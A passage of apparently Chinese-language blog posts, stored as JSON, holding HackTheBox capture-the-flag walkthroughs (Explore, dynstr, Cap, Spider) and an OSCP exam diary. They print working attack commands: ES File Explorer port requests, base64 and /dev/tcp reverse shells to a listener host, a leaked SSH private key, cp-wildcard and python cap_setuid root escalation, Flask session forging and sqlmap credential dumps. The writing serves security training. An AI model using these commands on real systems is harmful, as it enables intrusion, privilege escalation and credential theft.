Mediumhttps://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc https://github.com/theMiddleBlue/CVE-2019-11043 https://github.com/H74N/netcat-binaries/blob/master/nc https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et Linux Privilege Escalation Using PATH Variablehttps://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ Hackthebox Static writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-static/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Explore - HackTheBox","slug":"Explore-HackTheBox","date":"2021-06-28T01:35:59.000Z","updated":"2021-11-01T05:30:42.650Z","comments":true,"path":"2021/06/28/Explore-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/28/Explore-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/356 10.10.10.247 端口扫描应该是HTB第一台Android靶机，需要全端口扫描： 12345678910111213$ nmap -p- 10.10.10.247Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 08:59 CSTNmap scan report for 10.10.10.247Host is up (0.073s latency).Not shown: 65530 closed portsPORT STATE SERVICE2222/tcp open EtherNetIP-15555/tcp filtered freeciv38991/tcp open unknown42135/tcp open unknown59777/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 985.66 seconds 59777直接访问是禁止目录列举： ES File Explorer直接搜索android 59777，可以发现是ES File Explorer： Android file manager app exposing user data through open port | The Daily Swighttps://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port fs0c131y/ESFileExplorerOpenPortVuln: ES File Explorer Open Port Vulnerability - CVE-2019-6447https://github.com/fs0c131y/ESFileExplorerOpenPortVuln 1234curl --header \"Content-Type: application/json\" --request POST --data '&#123;\"command\":\"[my_awesome_cmd]\"&#125;' http://192.168.0.8:59777curl --header \"Content-Type: application/json\" --request POST --data '&#123;\"command\":\"getDeviceInfo\"&#125;' http://10.10.10.247:59777curl --header \"Content-Type: application/json\" --request POST --data '&#123;\"command\":\"listFiles\"&#125;' http://10.10.10.247:59777/sdcard user flagsdcard目录下发现user.txt，直接访问即可： Creds信息DCIM里有个creds.jpg: 12kristiKr1sT!5h@Rp3xPl0r3! 这个账号密码可以ssh登录： adb &amp; root flag端口扫描发现5555被过滤，可以通过ssh端口转发后adb连接，能直接su： 12345ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222adb connect localhost:5555adb shellsu root flag 参考资料 Android file manager app exposing user data through open port | The Daily Swighttps://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port fs0c131y/ESFileExplorerOpenPortVuln: ES File Explorer Open Port Vulnerability - CVE-2019-6447https://github.com/fs0c131y/ESFileExplorerOpenPortVuln Hack the box — Explore. Types of OS : Android | by 0xr2d2 | Jun, 2021 | Mediumhttps://0xr2d2.medium.com/explore-hack-the-box-bd93468b70f9","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"dynstr - HackTheBox","slug":"dynstr-HackTheBox","date":"2021-06-16T06:33:54.000Z","updated":"2021-10-18T05:16:55.883Z","comments":true,"path":"2021/06/16/dynstr-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/16/dynstr-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/352 10.10.10.244 端口扫描22,53,80: 12345678910111213141516171819202122$ nmap -sC -sV 10.10.10.244Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 13:08 CSTNmap scan report for 10.10.10.244Host is up (0.072s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)| 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)|_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid:|_ bind.version: 9.16.1-Ubuntu80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Dyna DNSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 46.19 seconds 80Dyna dns,得到几个域名和一组账号密码,得到的域名加hosts： 12345678910111213dnsalias.htbdynamicdns.htbno-ip.htbLondon Office,London.F: +42 0010-1010E: dns@dyna.htbUsername: dynadnsPassword: sndanyd10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb 几个域名直接访问都没什么东西 Dyn dns搜索可以知道是dyn dns,查看文档： Perform Update (RA-API) | Dyn Help Centerhttps://help.dyn.com/remote-access-api/perform-update/ DNS-O-Matic | Apihttps://www.dnsomatic.com/docs/api update根据文档可以update dns记录，用户名密码就是前面得到的： 命令注入hostname参数命令注入,得到www-data： 1234echo &quot;bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.9&#x2F;4444 0&gt;&amp;1&quot; | base64YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg&#x3D;&#x3D;&#x2F;nic&#x2F;update?hostname&#x3D;$(echo+&quot;YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg&#x3D;&#x3D;&quot;+|+base64+-d+|+bash)test.dynamicdns.htb&amp;myip&#x3D;10.10.14.9&amp;offline&#x3D;YES 信息枚举，发现一些信息 strace-C62796521.txtbindmgr用户目录可以发现一个strace文件，里面可以提取出一个私钥，但不能直接使用： authorized_keys根据authorized_keys可以知道配置的是只能通过*.infra.dyna.htb使用ssh私钥连接： bindmgr_id_rsa1echo \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\n-----END OPENSSH PRIVATE KEY-----\\n\" &gt; bindmgr_id_rsa PTR dns &amp; user flag根据update代码可以知道添加dns记录的命令和配置文件路径，其中有infra.key: 可以添加一个PTR记录 123456nsupdate -v -k &#x2F;etc&#x2F;bind&#x2F;infra.keyupdate add miao.infra.dyna.htb. 86400 a 10.10.14.9# 这里要有个空行，按一次回车update add 9.14.10.10.in-addr.arpa. 86400 PTR miao.infra.dyna.htb.sendshow user flagPTR记录添加成功后，可以SSH登录，得到user.txt: 提权信息bindmgr.shSudo -l发现bindmgr.sh，查看文件内容，发现里面检查.version文件，版本大于$BINDMGR_DIR/.version后调用cp,，使用通配符： 利用方式因为使用通配符，可以使用–preserve=mode作为文件名，会被cp处理为参数选项，复制它会保留这个目录中文件的属性，例如suid,因为是sudo调用，复制后的文件所有者是root，所以就拥有了root的suid： 1--preserve&#x3D;mode 提权 &amp; root flag12345678echo 2 &gt; .versioncp /bin/bash .chmod +s bashecho &gt; --preserve=modesudo /usr/local/bin/bindmgr.sh/etc/bind/named.bindmgr/bash -p 参考资料 Perform Update (RA-API) | Dyn Help Centerhttps://help.dyn.com/remote-access-api/perform-update/ DNS-O-Matic | Apihttps://www.dnsomatic.com/docs/api HTB dynstr [DISCUSSION] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-dynstr-DISCUSSION Dynstr Writeup [Full] | RaidForumshttps://raidforums.com/Thread-Free-Flag-Dynstr-Writeup-Full","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OSCP受験記","slug":"OSCP受験記","date":"2021-06-11T03:52:36.000Z","updated":"2021-06-12T05:11:24.906Z","comments":true,"path":"2021/06/11/OSCP受験記/","link":"","permalink":"https://darkwing.moe/2021/06/11/OSCP%E5%8F%97%E9%A8%93%E8%A8%98/","excerpt":"","text":"lab3月14开始，买的两个月的lab，做了一个月大概45台，然后就约了考试 lab的machine很多依赖关系，还有几个子网都是要隧道进去的，网络问题隧道连接太麻烦了，就只打了子网的入口解锁子网，里面的太麻烦就没做，public加三个子网总的应该是66个，不过最近刚新增了5个淘汰的考试机，应该是71了 第一次考试5月3号的，下午一点开始，正常的身份验证后，考试vpn不能直连，添加前置代理后可以连接，但询问监考是否可以修改ovpn配置文件添加代理，监考让我问chat，chat那边也给不出明确答案，让我邮件问challenge，最终在添加了代理的情况下连接openvpn进行考试，沟通浪费了5小时，晚上7点多才正式开始，做了几小时后困了去睡觉了，只做了25的BO分和一个20的，睡醒后放弃掉这次了 第二次考试然后150美元买了retake，约了6月9号的 6月9号中午11点开始，正常的身份验证，检查桌面的时候说明了桌子上显示器没插电源，监考让我换个地方或者把显示器拆了拿走，拆掉显示器后开始考试 autorecon跑其他4台，远程桌面连接BOF的调试机做BOF 但因为autorecon占用网络资源导致非常卡，所以先做其他的了，20的一个是上次做过的，跟监考说明了一下就直接参考上次的结果重做了一遍，1小时完成 之后autorecon差不多了，做BOF，基础的windows栈溢出，40分钟完成 10分的那个就是某个端口服务存在漏洞，搜到exp，直接是root，reverse shell的时候有点问题就先上传了webshell，通过webshell加载的reverse shell，40分钟吧 25的那台入口挺麻烦的，三个不常见端口的web服务不同的漏洞，结合得到某个端口的密码，登录上传webshell，加载reverse shell，这部分4个小时吧 之后winpeas，利用点是某个stoped的service可控，修改exe启动后得到system shell ，一个半小时 另一个20的也是上次做过的，但上次没做完，问题在于reverse shell的port被防火墙过滤了，换了对应端口后打进去得到local，这部分一个小时 system的猜测的几个点都不成功，三个小时后放弃了 休息后revert，整理截图，用了一个半小时 之后提前结束考试，睡觉 10号早上8点起床，写报告，11点前就写完了，导出pdf上传提交 11号中午11点多收到success邮件 时间记录中间有多次休息，每次10分钟左右 123456789109号20-1 local 12:0620-1 root 12:2525-BOF 13:0010 13:5025-local 17:5325-system 19:3320-2 local 20:2423:15，决定放弃最后10分，休息后revert1个半小时整理截图，结束考试，睡觉 hint全端口扫描，入口很大概率在非常见端口服务 reverse shell port使用目标开放对应的，例如目标开放4444，自己的listerer就也用4444 enum harder","categories":[],"tags":[]},{"title":"Cap - HackTheBox","slug":"Cap-HackTheBox","date":"2021-06-07T07:32:06.000Z","updated":"2021-10-09T00:40:20.743Z","comments":true,"path":"2021/06/07/Cap-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/07/Cap-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/351 10.10.10.245 端口扫描21，22，80: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114$ nmap -sC -sV 10.10.10.245Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 15:08 CSTNmap scan report for 10.10.10.245Host is up (0.069s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 404 NOT FOUND| Server: gunicorn| Date: Mon, 07 Jun 2021 07:09:31 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 232| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest:| HTTP/1.0 200 OK| Server: gunicorn| Date: Mon, 07 Jun 2021 07:09:25 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 19386| &lt;!DOCTYPE html&gt;| &lt;html class=\"no-js\" lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;Security Dashboard&lt;/title&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;link rel=\"shortcut icon\" type=\"image/png\" href=\"/static/images/icon/favicon.ico\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/bootstrap.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/font-awesome.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/themify-icons.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/metisMenu.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/owl.carousel.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/slicknav.min.css\"&gt;| &lt;!-- amchar| HTTPOptions:| HTTP/1.0 200 OK| Server: gunicorn| Date: Mon, 07 Jun 2021 07:09:25 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Allow: OPTIONS, HEAD, GET| Content-Length: 0| RTSPRequest:| HTTP/1.1 400 Bad Request| Connection: close| Content-Type: text/html| Content-Length: 196| &lt;html&gt;| &lt;head&gt;| &lt;title&gt;Bad Request&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;| Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;| &lt;/body&gt;|_ &lt;/html&gt;|_http-server-header: gunicorn|_http-title: Security Dashboard1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.91%I=7%D=6/7%Time=60BDC624%P=x86_64-apple-darwin19.6.0%rSF:(GetRequest,2FE5,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDateSF::\\x20Mon,\\x2007\\x20Jun\\x202021\\x2007:09:25\\x20GMT\\r\\nConnection:\\x20cloSF:se\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\xSF:2019386\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"eSF:n\\\"&gt;\\n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\xSF:20\\x20&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\nSF:\\x20\\x20\\x20\\x20&lt;title&gt;Security\\x20Dashboard&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;SF:meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-sSF:cale=1\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"shortcut\\x20icon\\\"\\x20type=\\\"SF:image/png\\\"\\x20href=\\\"/static/images/icon/favicon\\.ico\\\"&gt;\\n\\x20\\x20\\x20SF:\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/bootstrap\\.min\\.cSF:ss\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/csSF:s/font-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\SF:\"\\x20href=\\\"/static/css/themify-icons\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x2SF:0rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/metisMenu\\.css\\\"&gt;\\n\\x20\\x20\\xSF:20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/owl\\.carousel\\.SF:min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/staSF:tic/css/slicknav\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20amchar\")%r(HTTPOSF:ptions,B3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20MoSF:n,\\x2007\\x20Jun\\x202021\\x2007:09:25\\x20GMT\\r\\nConnection:\\x20close\\r\\nCSF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HESF:AD,\\x20GET\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,121,\"HTTP/1\\SF:.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x2SF:0text/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n&lt;html&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x2SF:0\\x20\\x20\\x20&lt;title&gt;Bad\\x20Request&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;bSF:ody&gt;\\n\\x20\\x20\\x20\\x20&lt;h1&gt;&lt;p&gt;Bad\\x20Request&lt;/p&gt;&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20ISF:nvalid\\x20HTTP\\x20Version\\x20&amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20&amp;#x27SF:;RTSP/1\\.0&amp;#x27;&amp;#x27;\\n\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(FourOhFourRequesSF:t,189,\"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:SF:\\x20Mon,\\x2007\\x20Jun\\x202021\\x2007:09:31\\x20GMT\\r\\nConnection:\\x20closSF:e\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2SF:0232\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x203\\.SF:2\\x20Final//EN\\\"&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/title&gt;\\n&lt;h1&gt;Not\\x20FoundSF:&lt;/h1&gt;\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\xSF:20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\SF:x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.&lt;/p&gt;\\n\");Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 153.29 seconds 80一个网络相关的网站： pcapsecurity snapshot每次访问id都不同，下载查看是HTTP请求，如果将其修改为0，得到的pcap中可以得到FTP相关信息： user flagFTP用户名密码可以直接SSH，得到user.txt: 12nathanBuck3tH4TF0RM3! 提权信息linpeas可以发现python有cap_setuid： https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities https://gtfobins.github.io/gtfobins/python/#capabilities 根据文档，可以通过python change UID： 1CAP_SETUID Allow changing of the UID (set UID of root in you process) 提权 &amp; root flag可以直接给bash suid，读取root.txt: 12python3 -c 'import os; os.setuid(0); os.system(\"whoami\")'python3 -c 'import os; os.setuid(0); os.system(\"chmod +s /bin/bash\")' 参考资料 https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities https://gtfobins.github.io/gtfobins/python/#capabilities [HTB] Hackthebox Cap Writeup – HACKINGWEBSERVICEhttps://codingsec.wordpress.com/2021/06/06/htb-hackthebox-cap-writeup/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Spider - HackTheBox","slug":"Spider-HackTheBox","date":"2021-06-02T08:06:03.000Z","updated":"2021-10-25T01:29:51.604Z","comments":true,"path":"2021/06/02/Spider-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/02/Spider-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/350 10.10.10.243 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.243Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-02 13:34 CSTNmap scan report for 10.10.10.243Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)| 256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)|_ 256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Did not follow redirect to http://spider.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds 80直接访问时跳到域名spider.htb，加hosts后访问： 110.10.10.243 spider.htb 目录扫描12345678910gobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/cart (Status: 500) [Size: 290]/checkout (Status: 500) [Size: 290]/index (Status: 500) [Size: 290]/login (Status: 200) [Size: 1832]/logout (Status: 302) [Size: 209] [--&gt; http://spider.htb/]/main (Status: 500) [Size: 290]/register (Status: 200) [Size: 2130]/user (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]/view (Status: 302) [Size: 219] [--&gt; http://spider.htb/login] register正常注册是得到个uuid，跳转到登录： SSTI因为是flask，尝试ssti,登录后查看用户信息，确认存在SSTI： config获取config，得到SECRET_KEY： 123&#123;&#123;config&#125;&#125;&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;RATELIMIT_ENABLED&#39;: True, &#39;RATELIMIT_DEFAULTS_PER_METHOD&#39;: False, &#39;RATELIMIT_SWALLOW_ERRORS&#39;: False, &#39;RATELIMIT_HEADERS_ENABLED&#39;: False, &#39;RATELIMIT_STORAGE_URL&#39;: &#39;memory:&#x2F;&#x2F;&#39;, &#39;RATELIMIT_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT_HEADER_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT_HEADER_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT_HEADER_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT_HEADER_RETRY_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD_FOLDER&#39;: &#39;static&#x2F;uploads&#39;&#125;&gt; Flask session查看cookie内容格式： 主要就是uuid，应该是通过uuid获取信息展示，所以尝试uuid那里进行注入 sql注入前面已经得到的secret，所以可以自己生成任意内容session： 12flask-unsign --sign --secret Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 --cookie \"&#123;'uuid': '\\' or 1=1 #'&#125;\"eyJ1dWlkIjoiJyBvciAxPTEgIyJ9.YLcgnA.rIXYazLnepMVrYeq-x45HZO8yP0 修改cookie后我们是chiv用户，但并不能正常访问admin： sqlmap可以用sqlmap的eval处理session参数： 123sqlmap http://spider.htb/ --eval \"from flask_unsign import session as s; session = s.sign(&#123;'uuid': session&#125;, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')\" --cookie=\"session=*\" --delay 1 --dump129f60ea-30cf-4065-afb9-6be45ad38b73 ： chiv : ch1VW4sHERE7331 admin使用chiv的id和密码登录，可以访问admin,查看得到portal地址： 1http:&#x2F;&#x2F;spider.htb&#x2F;a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal SSTI to shellPortal 里继续SSTI，存在waf过滤了一些特殊字符,例如点，可以把命令base64后绕过： 12345blocked ： . bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.5&#x2F;443 